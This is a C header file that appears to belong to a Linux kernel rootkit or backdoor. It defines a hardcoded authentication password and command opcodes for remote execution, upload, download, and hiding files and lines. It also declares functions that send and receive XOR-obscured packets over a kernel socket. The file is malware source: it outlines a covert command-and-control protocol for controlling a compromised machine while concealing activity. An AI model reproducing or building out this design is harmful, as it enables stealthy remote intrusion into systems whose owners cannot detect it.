#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <linux/net.h>
#include <linux/types.h>

#include "crypto.h"

#define WLKOM_PASSWORD  "wlk0m_s3cr3t"

#define CMD_AUTH        0x01
#define CMD_EXEC        0x02
#define CMD_UPLOAD      0x03
#define CMD_DOWNLOAD    0x04
#define CMD_HIDE_FILE   0x05
#define CMD_UNHIDE_FILE 0x06
#define CMD_HIDE_LINE   0x07
#define CMD_UNHIDE_LINE 0x08
#define CMD_PING        0x09
#define CMD_PONG        0x0A

/* Connection context passed through all protocol and command layers. */
typedef struct
{
    struct socket *sock;
    bool           authed;
} conn_ctx_t;

/**
 * @brief Serializes and sends a protocol packet: [opcode][length][XOR payload].
 * @param ctx      Connection context (socket used for sending).
 * @param opcode   Command opcode.
 * @param payload  Data to send (may be NULL when len == 0).
 * @param len      Payload length in bytes.
 * @return 0 on success, -1 on error.
 */
int send_packet(conn_ctx_t *ctx, uint8_t opcode, const char *payload,
                uint32_t len);

/**
 * @brief Receives and decrypts a protocol packet.
 * @param ctx      Connection context (socket used for receiving).
 * @param opcode   Output: received opcode.
 * @param payload  Output: heap-allocated decrypted payload (caller must kfree).
 * @param len      Output: payload length.
 * @return 0 on success, -1 on error.
 */
int recv_packet(conn_ctx_t *ctx, uint8_t *opcode, char **payload,
                uint32_t *len);

#endif /* ! PROTOCOL_H */
